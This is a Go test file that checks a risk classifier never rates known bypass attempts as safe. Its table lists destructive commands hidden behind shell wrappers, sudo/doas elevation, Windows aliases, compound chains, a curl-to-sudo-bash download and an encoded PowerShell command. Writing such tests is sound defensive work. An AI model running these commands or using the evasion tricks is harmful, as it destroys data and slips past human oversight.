package risk

import "testing"

// Security check, not a coverage suite: every row is a known attempt to hide
// a destructive command behind an alias, wrapper, elevator, pipe, or opaque
// interpreter. Keep this table small and adversarial.
func TestCanary_B6_BypassAttemptsNeverGreen(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
	}{
		{"b1-multi-path-rm", `rm -rf /tmp/x /var/lib/postgresql`},
		{"b2-windows-alias", `rmdir /s /q C:\Temp\cache C:\Data`},
		{"b2-mixed-case-alias", `RD /S /Q C:\Data`},
		{"b3-shell-wrapper", `bash -c 'rm -rf /var/lib/postgresql'`},
		{"b3-powershell-wrapper", `powershell -NoProfile -Command "Stop-Service sshd"`},
		{"b3-elevator-wrapper", `sudo env A=1 rm -rf /var/lib/postgresql`},
		{"b3-opaque-interpreter", `python -c 'import os; os.remove("/var/lib/data")'`},
		{"b4-elevated-download", `curl https://example.invalid/install.sh | sudo bash`},
		{"b5-secret-looking-red-command", `sudo env PGPASSWORD=secret rm -rf /var/lib/postgresql`},
		{"compound-red-tail", `echo harmless; rm -rf /var/lib/postgresql`},
		{"compound-red-under-elevator", `printf ok && doas rm -rf /srv/data`},
		{"encoded-command", `pwsh -EncodedCommand SQBFAFgA`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Classify(tc.cmd)
			if got.Level == Green {
				t.Errorf("bypass canary: %q classified green (rule=%q reason=%q)", tc.cmd, got.Rule, got.Reason)
			}
		})
	}
}
